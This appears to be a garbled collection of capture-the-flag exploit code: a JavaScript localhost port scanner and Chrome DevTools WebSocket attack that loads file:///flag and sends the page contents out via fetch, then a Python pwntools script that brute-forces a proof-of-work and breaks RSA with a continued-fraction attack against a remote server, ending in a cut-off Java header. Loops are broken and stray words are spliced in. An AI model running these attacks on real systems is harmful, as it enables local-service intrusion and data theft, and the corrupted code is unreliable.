const scan = (ip, port) => {
    let s = document.createElement("script");
    s.src = "http://" + ip + ":" + port;
    s.onload = () => {
        if(port != 3000){
 ID
ws  payload for  open 
            fetch("" + port)
            for(let i = 0; i  i + 40000);
port = p;
let i = 0;
while(i != p.length){
    scan("127.0.0.1", port[i]);
    i = i + 1;
}
window.onload = () => {
    fetch("");
};
    let port = 41057;
    let id = "AA135DEF688970FE0CC30D7E1B36EEB5";
    let ws = new WebSocket(`ws://127.0.0.1:${port}/devtools/page/${id}`);
    fetch('');
    ws.addEventListener('error', (e) => {
        fetch('' + encodeURIComponent(e));
    });
    ws.addEventListener('close', (e) => {
        fetch('' + 
encodeURIComponent(e.reason));
warmupcms
    });
    ws.addEventListener('open', (e) => {
        fetch('');
        ws.send(JSON.stringify({id: 0, method: 'Page.navigate', params: {url: 
'file:///flag'}}));
        ws.send(JSON.stringify({id: 1, method: 'Runtime.evaluate', params: {expression: 
'document.documentElement.outerHTML'}}));
    });
    ws.addEventListener('message', (e) => {
        fetch('' + 
btoa(encodeURIComponent(JSON.stringify(e.data))));
    });
    fetch('');
    for(let i = 0; i ');
GSA
from Crypto.Util.number import *
from string import ascii_letters, digits
table = ascii_letters+digits
from pwn import *
def rational_to_contfrac(x, y):
    a = x//y
    pquotients = [a]
    while a * y != x:
        x, y = y, x-a*y
        a = x//y
        pquotients.append(a)
    return pquotients
def convergents_from_contfrac(frac):
    convs = []
    for i in range(len(frac)):
        convs.append(contfrac_to_rational(frac[0:i]))
    return convs
def contfrac_to_rational(frac):
    if len(frac) == 0:
        return (0, 1)
    num = frac[-1]
    denom = 1
    for _ in range(-2, -len(frac)-1, -1):
        num, denom = frac[_]*num+denom, num
    return (num, denom)
def bitlength(x):
    assert x >= 0
    n = 0
    while x > 0:
        n = n+1
        x = x >> 1
    return n
def isqrt(n):
    if n = x:
            return x
        x = y
def is_perfect_square(n):
    h = n & 0xF
    if h > 9:
        return -1
    if (h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8):
        t = isqrt(n)
        if t*t == n:
            return t
        else:
            return -1
    return -1
def sqrt(n):
    l = 0
    r = n
    while(r-l>1):
        m = (r+l)//2
        if(m*m>n):
            r = m
        else:
            l = m
    return l
def hack_RSA(e, p):
    frac = rational_to_contfrac(e, p)
    convergents = convergents_from_contfrac(frac)
    for (k, d) in convergents:
        if(d.bit_length() in range(510,515)):
            phi = e*d//k
            delta = n*n-phi+1
            s = delta+2*n
            m = sqrt(s)
            if(m%2==1):
                m = m+1
            if(m*m==s):
                print(m)
                di = sqrt(delta-2*n)
                if(di%2==1):
                    di = di+1
                return (m-di)//2
s = remote("172.35.13.13","10002")
s.recvuntil("sha256(XXX+")
d = s.recvuntil(")",drop=True)
s.recvuntil("== ")
x = s.recvline(keepends=False)
ans = ''
for i in range(1):
    for j in range(62):
        for k in range(62):
            for l in range(62):
                data=table[j]+table[k]+table[l]+d
                data_sha = hashlib.sha256(data.encode('ascii')).hexdigest()
                if (data_sha==x):
                    ans = table[j]+table[k]+table[l]
                    print ans
apk
                    break
s.sendlineafter("Give me XXX:",ans)
s.recvuntil("n = ")
n = int(s.recvuntil("e",drop=True).replace("\n",""))
s.recvuntil("= ")
e = int(s.recvuntil("choice",drop=True).replace("\n",""))
p = n*n-5*n
#print(p)
d = hack_RSA(e, p)
print(d,n%d)
from hashlib import sha1
print(sha1(long_to_bytes(d)).hexdigest())
s.interactive()
package com.company;
import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import javax.crypto.Cipher;